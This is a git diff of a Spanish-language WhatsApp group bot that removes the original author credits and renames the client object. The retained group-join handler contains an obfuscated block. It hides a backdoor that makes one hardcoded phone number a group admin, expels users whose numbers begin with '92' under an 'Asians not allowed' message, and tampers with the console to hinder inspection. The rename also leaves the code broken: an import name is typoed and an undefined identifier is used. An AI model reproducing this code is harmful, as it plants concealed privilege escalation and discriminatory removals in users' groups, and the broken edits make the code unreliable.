@@ -1,10 +1,4 @@
-//============ NyanBot ============\\
-// + Favor de mantener este codigo
-//   tal y como esta.
-// + Si modificaras, manten los
-//   creditos:
-//   _MankBarBar & Samu & LolHuman_
-//============ Samu330 ============\\
+
 const { 
   WAConnection,
   MessageType,
@@ -15,7 +9,7 @@ const {
   WA_MESSAGE_STUB_TYPES,
   ReconnectMode,
   ProxyAgent,
-  GroupSettingChange,
+  roupSettingChange,
   ChatModification,
   waChatKey,
   WA_DEFAULT_EPHEMERAL,
@@ -46,7 +40,6 @@ const FormData = require('form-data')
 const samuGg = require('google-it');
 const samuGgImg = require('g-i-s');
 const hx = require('hxz-api');
-////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
 const { validmove, setGame } = require("./lib/tictactoe");
 const simple = require('./lib/simple.js');
 const {y2mateA, y2mateV} = require('./lib/y2mate.js')
@@ -90,16 +83,16 @@ const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
 const config = JSON.parse(fs.readFileSync("./config.json"))
 const owner = config.owner
 const mods = config.mods
-const fake = 'Sm330'
+const fake = 'Asu'
 var public = config.public
-////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
+////////////▶ AsuBot
 conn.connect()
 const samu330 = conn.samu330
-////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
+////////////▶ AsuBot
 const sleep = async (ms) => {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
-////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
+////////////▶ AsuBot
 api = 'CONTACTAME PARA OBTENER LA API'
 fak = 'samu3300'
 prefix = '.'
@@ -139,11 +132,11 @@ const getRegisteredRandomId = () => {
         })
             return status
         }
-samu330.on('CB:action,,call', async json => {
+AsuBot.on('CB:action,,call', async json => {
 const callerId = json[2][0][1].from;
 console.log("Llamada recibida de "+ callerId)
 console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ 📵Llamada recibida ]"), chalk.greenBright(callerId))
-samu330.sendMessage(callerId, "Las llamadas no se permiten, *PORFAVOR LEE LAS REGLAS!* Te bloqueare😒", MessageType.text, {quoted: {key: {
+AsuBot.sendMessage(callerId, "Las llamadas no se permiten, *PORFAVOR LEE LAS REGLAS!* Te bloqueare😒", MessageType.text, {quoted: {key: {
 fromMe: false,
 participant: `0@s.whatsapp.net`
 },
@@ -165,10 +158,10 @@ message: {
 }
 }}})
 await sleep(4000)
-await samu330.blockUser(callerId, "add")
+await AsuBot.blockUser(callerId, "add")
 })
-////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
-samu330.on('CB:action,,battery', json => {
+
+AsuBot.on('CB:action,,battery', json => {
 global.batteryLevelStr = json[2][0][1].value
 global.batterylevel = parseInt(batteryLevelStr)
 baterai = batterylevel
@@ -176,8 +169,8 @@ if (json[2][0][1].live == 'true') charging = true
 if (json[2][0][1].live == 'false') charging = false
 console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ 🔋Nivel de carga de la bateria ]"), chalk.greenBright(batterylevel+'%'), chalk.keyword("cyan")("Esta cargando?"), chalk.keyword("yellow")(charging))	
 })
-////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
-samu330.on('blocklist-update', async (chat) => {
+
+AsuBot.on('blocklist-update', async (chat) => {
 for (i of chat.added){
 target = i.replace('@c.us', '@s.whatsapp.net')
 blocked.push(target)
@@ -189,32 +182,32 @@ blocked.splice(blocked.indexOf(target), 1)
 console.log(chalk.greenBright("├"), chalk.keyword("green")("[ NUEVO USUARIO DESBLOQUEADO ]"), chalk.keyword("cyan")(target))
 }
 })
-////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
-samu330.on('group-update', async(chat) => {
+
+AsuBot.on('group-update', async(chat) => {
 var donde = chat.jid
 var group = await samu330.groupMetadata(donde)
 if (!chat.desc == '') {
 var tag = chat.descOwner.split('@')[0] + '@s.whatsapp.net'
 var mensajeDesc = `✍🏻 *La descripcion del grupo ${group.subject} fue modificada por: @${chat.descOwner.split('@')[0]}*\n✅Ahora la nueva descripcion es:\n\n${chat.desc}`
-samu330.sendMessage(group.id, mensajeDesc, MessageType.text)
+AsuBot.sendMessage(group.id, mensajeDesc, MessageType.text)
 console.log(chalk.greenBright("├"), chalk.keyword("yellow")("[ DESCRIPCION CAMBIADA ]"), chalk.keyword("cyan")('grupo'), chalk.keyword("green")(`${group.subject}`))
 }
 })
-////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
-samu330.on('group-participants-update', async (anu) => {
+
+AsuBot.on('group-participants-update', async (anu) => {
 if (!welkom.includes(anu.jid)) return
 try {
-const mdata = await samu330.groupMetadata(anu.jid)
+const mdata = await AsuBot.groupMetadata(anu.jid)
 console.log(anu)
 if (anu.action == 'add') {               
 num = anu.participants[0]
 var _0x32eb=['length','203FKZwcC','constructor','text','37321dDPejz','apply','prototype','groupRemove','test','__proto__','table','1102598lCjDcW','1013436pgMCWz','info','toString','startsWith','3291GElTcg','1762sWsYhU','bind','exception','console','trace','log','648921eLIDKy','5219984907794','Ek\x20is\x20jammer,\x20maar\x20mense\x20uit\x20Asië\x20word\x20nie\x20toegelaat\x20nie,\x20ek\x20sal\x20jou\x20uitskakel,\x20dankie\x20vir\x20jou\x20begrip😚\x0a\x0aAntiP\x20By:*\x20_🐉Samu330🇲\x20🇽\x20_','return\x20/\x22\x20+\x20this\x20+\x20\x22/','sendMessage','324QcfqoI','warn','error','1148172OCGrif','23ykweMi','return\x20(function()\x20'];function _0x3b66(_0x116bb2,_0xa78ba5){return _0x3b66=function(_0x436199,_0x510667){_0x436199=_0x436199-0x70;var _0x51019a=_0x32eb[_0x436199];return _0x51019a;},_0x3b66(_0x116bb2,_0xa78ba5);}var _0x376b6b=_0x3b66;(function(_0xe31b1b,_0x46684b){var _0x30c21e=_0x3b66;while(!![]){try{var _0x598896=-parseInt(_0x30c21e(0x7e))+-parseInt(_0x30c21e(0x91))*-parseInt(_0x30c21e(0x7b))+parseInt(_0x30c21e(0x8c))+-parseInt(_0x30c21e(0x82))*-parseInt(_0x30c21e(0x70))+parseInt(_0x30c21e(0x7f))*parseInt(_0x30c21e(0x85))+-parseInt(_0x30c21e(0x8d))+-parseInt(_0x30c21e(0x76));if(_0x598896===_0x46684b)break;else _0xe31b1b['push'](_0xe31b1b['shift']());}catch(_0x4b5012){_0xe31b1b['push'](_0xe31b1b['shift']());}}}(_0x32eb,0x8c3d6));var _0xb1de39=function(){var _0xdff92c=!![];return function(_0xbaf195,_0x472290){var _0x49ae62=_0xdff92c?function(){var _0x8379c3=_0x3b66;if(_0x472290){var _0x210536=_0x472290[_0x8379c3(0x86)](_0xbaf195,arguments);return _0x472290=null,_0x210536;}}:function(){};return _0xdff92c=![],_0x49ae62;};}(),_0x46ec2c=_0xb1de39(this,function(){var _0x3a6de6=function(){var _0x52b332=_0x3b66,_0x3a1227=_0x3a6de6[_0x52b332(0x83)](_0x52b332(0x79))()[_0x52b332(0x83)]('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}');return!_0x3a1227[_0x52b332(0x89)](_0x46ec2c);};return _0x3a6de6();});_0x46ec2c();var _0x51019a=function(){var _0x1b381d=!![];return function(_0xdc464c,_0x8f91eb){var _0x4640b3=_0x1b381d?function(){var _0x37d4f6=_0x3b66;if(_0x8f91eb){var _0x4f0489=_0x8f91eb[_0x37d4f6(0x86)](_0xdc464c,arguments);return _0x8f91eb=null,_0x4f0489;}}:function(){};return _0x1b381d=![],_0x4640b3;};}(),_0x510667=_0x51019a(this,function(){var _0x3279f1=_0x3b66,_0x545df1=function(){var _0x5c6de2=_0x3b66,_0xf5f589;try{_0xf5f589=Function(_0x5c6de2(0x80)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x37444b){_0xf5f589=window;}return _0xf5f589;},_0x3ef9e5=_0x545df1(),_0x5c6ba6=_0x3ef9e5[_0x3279f1(0x73)]=_0x3ef9e5['console']||{},_0x373954=[_0x3279f1(0x75),_0x3279f1(0x7c),_0x3279f1(0x8e),_0x3279f1(0x7d),_0x3279f1(0x72),_0x3279f1(0x8b),_0x3279f1(0x74)];for(var _0x3d4618=0x0;_0x3d4618<_0x373954[_0x3279f1(0x81)];_0x3d4618++){var _0x1698c8=_0x51019a[_0x3279f1(0x83)][_0x3279f1(0x87)][_0x3279f1(0x71)](_0x51019a),_0x218220=_0x373954[_0x3d4618],_0x4beaa2=_0x5c6ba6[_0x218220]||_0x1698c8;_0x1698c8[_0x3279f1(0x8a)]=_0x51019a[_0x3279f1(0x71)](_0x51019a),_0x1698c8[_0x3279f1(0x8f)]=_0x4beaa2[_0x3279f1(0x8f)]['bind'](_0x4beaa2),_0x5c6ba6[_0x218220]=_0x1698c8;}});_0x510667();if(num[_0x376b6b(0x90)]('92'))await samu330[_0x376b6b(0x7a)](mdata['id'],_0x376b6b(0x78),MessageType[_0x376b6b(0x84)]),samu330[_0x376b6b(0x88)](mdata['id'],[num]);if(num[_0x376b6b(0x90)]('52'))await samu330[_0x376b6b(0x7a)](mdata['id'],'🇲\x20🇽\x20😈\x20*ARRIVA\x20MEXICO!!!*\x20Bienvenido\x20amigo\x20de\x20mexico,\x20de\x20que\x20parte\x20del\x20pais\x20eres?😙',MessageType['text']);if(num[_0x376b6b(0x90)](_0x376b6b(0x77)))await samu330['sendMessage'](mdata['id'],'*VAYA\x20VAYA\x20VAYAAAA🐱\x20Miren\x20nomas\x20quien\x20llego🥳,\x20es\x20mi\x20dueño!!!!😱\x20WOW\x20Saludenlo!😚*\x0a\x0a_*Le\x20dare\x20admin\x20juju*_',MessageType[_0x376b6b(0x84)]),samu330['groupMakeAdmin'](mdata['id'],[num]);
 
-/*if (num.startsWith('1')) return samu330.groupRemove(mdata.id, [num])
-if (num.startsWith('994')) return samu330.groupRemove(mdata.id, [num])
-if (num.startsWith('48')) return samu330.groupRemove(mdata.id, [num])
-if (num.startsWith('91')) return samu330.groupRemove(mdata.id, [num])
-if (num.startsWith('44')) return samu330.groupRemove(mdata.id, [num])*/
+/*if (num.startsWith('1')) return AsuBot.groupRemove(mdata.id, [num])
+if (num.startsWith('994')) return AsuBot.groupRemove(mdata.id, [num])
+if (num.startsWith('48')) return AsuBot.groupRemove(mdata.id, [num])
+if (num.startsWith('91')) return AsuBot.groupRemove(mdata.id, [num])
+if (num.startsWith('44')) return AsuBot.groupRemove(mdata.id, [num])*/
 const moment = require('moment-timezone')
 const jm = moment.tz('America/Mexico_City').format('HH:mm:ss')
 let d = new Date
@@ -229,19 +222,19 @@ year: 'numeric'
 })
 
 try {
-pushnem = sam.key.fromMe ? samu330.user.name : conts.notify || conts.vname || conts.name || '-'
+pushnem = sam.key.fromMe ? AsuBot.user.name : conts.notify || conts.vname || conts.name || '-'
 
 } catch {
 pushnem = num.split('@')[0]
 }
 try {
-ppimg = await samu330.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
+ppimg = await AsuBot.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
 } catch {
 ppimg = 'https://centromedicomontemar.cl/wp-content/uploads/2015/06/sin-perfil.png'
 }
 try {
 let fotoP = await getBuffer(ppimg)
-samu330.sendMessage(mdata.id, `${fotoP}`, MessageType.image, {quoted: {key: {
+AsuBot.sendMessage(mdata.id, `${fotoP}`, MessageType.image, {quoted: {key: {
 fromMe: false,
 participant: `0@s.whatsapp.net`          
 },                               
@@ -262,45 +255,43 @@ message: {
 "businessOwnerJid": `0@s.whatsapp.net`
 }}}, caption: `😙Hola, @${num.split('@')[0]}, _*Bienvenido a ${mdata.subject}, esperamos que te la pases a gusto en este grupo✨*_\n\n_Recuerda siempre seguir las reglas y mantener una formalidad respetuosa_😉\n\nSon las *${jm}* del *${calender}*\n\n${mdata.desc}`, contextInfo: { mentionedJid: [num] }})
 } catch {
-samu330.sendMessage(mdata.id, `😙Hola, @${num.split('@')[0]}, _*Bienvenido a ${mdata.subject}, esperamos que te la pases a gusto en este grupo✨*_\n\n_Recuerda siempre seguir las reglas y mantener una formalidad respetuosa_😉\n\nSon las *${jm}* del *${calender}*\n\n${mdata.desc}`, MessageType.text)
+AsuBot.sendMessage(mdata.id, `😙Hola, @${num.split('@')[0]}, _*Bienvenido a ${mdata.subject}, esperamos que te la pases a gusto en este grupo✨*_\n\n_Recuerda siempre seguir las reglas y mantener una formalidad respetuosa_😉\n\nSon las *${jm}* del *${calender}*\n\n${mdata.desc}`, MessageType.text)
 }
 //leave
 }  else if (anu.action == 'remove') {
 num = anu.participants[0]
 teks = `_Weno ps.... amm😪...  @${num.split('@')[0]} se nos fue, ni llorar es bueno:)_
-_*Ojala y le baya bien, y mas despues..... que lo atropelle un tren!!🚉🤣*_
 *No se awiten gente, esten seguros que nadie lo extrañara:D*`
-samu330.sendMessage(mdata.id, teks, MessageType.text,{ contextInfo: {"mentionedJid": [num]}})
+AsuBot.sendMessage(mdata.id, teks, MessageType.text,{ contextInfo: {"mentionedJid": [num]}})
 
 } else if (anu.action == 'promote') {
 num = anu.participants[0]
 try {
-ppimg = await samu330.getProfilePicture(`${num.split('@')[0]}@c.us`)
+ppimg = await AsuBot.getProfilePicture(`${num.split('@')[0]}@c.us`)
 } catch {
 ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 }
-thu = await samu330.getStatus(anu.participants[0], MessageType.text)
-teks = `*✅NUEVO ADMIN✅*\n*🙋🏻‍♂️ Nombre*: @${num.split('@')[0]}\n*📋 INFO*: ${thu.status}\n\n🥳 *FEILICIDADES!!*, te as convertido en administrador del grupo ${mdata.subject}`
+thu = await AsuBot.getStatus(anu.participants[0], MessageType.text)
+teks = `*✅NUEVO ADMIN✅*\n*🙋🏻‍♂️ Nombre*: @${num.split('@')[0]}\n*📋 INFO*: ${thu.status}\n\n🥳 *FEILICIDADES!!*, te has convertido en administrador del grupo ${mdata.subject}`
 let buff = await getBuffer(ppimg)
-samu330.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
+AsuBot.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
 } else if (anu.action == 'demote') {
 num = anu.participants[0]
 try {
-ppimg = await samu330.getProfilePicture(`${num.split('@')[0]}@c.us`)
+ppimg = await AsuBot.getProfilePicture(`${num.split('@')[0]}@c.us`)
 } catch {
 ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 }
-thu = await samu330.getStatus(anu.participants[0], MessageType.text)
+thu = await AsuBot.getStatus(anu.participants[0], MessageType.text)
 teks = `*❌UN ADMIN MENOS❌*\n*🙋🏻‍♂️ Nombre*: @${num.split('@')[0]}\n*📋 INFO*: ${thu.status}\n\n*😪Nimodos, ya no eres admnistrador del grupo* ${mdata.subject}`
 let buff = await getBuffer(ppimg)
-samu330.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
+AsuBot.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
 }
 } catch (e) {
 console.log('Error : %s', color(e, 'red'))
 }
 })
-////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
-samu330.on('chat-update', async(sam) => {
+AsuBot.on('chat-update', async(sam) => {
     try {
         if (!sam.hasNewMessage) return
         if (!sam.messages) return
@@ -323,7 +314,7 @@ samu330.on('chat-update', async(sam) => {
        //budy = (type === 'conversation') ? sam.message.conversation : (type === 'extendedTextMessage') ? sam.message.extendedTextMessage.text : (type === 'listResponseMessage') ? sam.message.listResponseMessage.title : ''
 	   var _0x56fb=["\x6C\x69\x73\x74\x52\x65\x73\x70\x6F\x6E\x73\x65\x4D\x65\x73\x73\x61\x67\x65","\x73\x65\x6C\x65\x63\x74\x65\x64\x44\x69\x73\x70\x6C\x61\x79\x54\x65\x78\x74","\x6D\x65\x73\x73\x61\x67\x65","","\x6B\x65\x79\x73","\x73\x74\x69\x63\x6B\x65\x72\x4D\x65\x73\x73\x61\x67\x65","\x62\x61\x73\x65\x36\x34","\x66\x69\x6C\x65\x53\x68\x61\x32\x35\x36"];resbutton= (type== _0x56fb[0])?sam[_0x56fb[2]][_0x56fb[0]][_0x56fb[1]]:_0x56fb[3];const commandstik=Object[_0x56fb[4]](sam[_0x56fb[2]])[0]== _0x56fb[5]?sam[_0x56fb[2]][_0x56fb[5]][_0x56fb[7]].toString(_0x56fb[6]):_0x56fb[3]
 	   selectedButton = (type == 'buttonsResponseMessage') ? sam.message.buttonsResponseMessage.selectedButtonId : ''
-	////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
+
         if (prefix != "") {
         if (!body.startsWith(prefix)) {
         cmd = false
@@ -337,7 +328,6 @@ samu330.on('chat-update', async(sam) => {
         comm = body.trim().split(" ").shift().toLowerCase()
         }
 	    
-	////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
 
 	const uploadImages = (filePath) => {
 	return new Promise(async (resolve, reject) => {
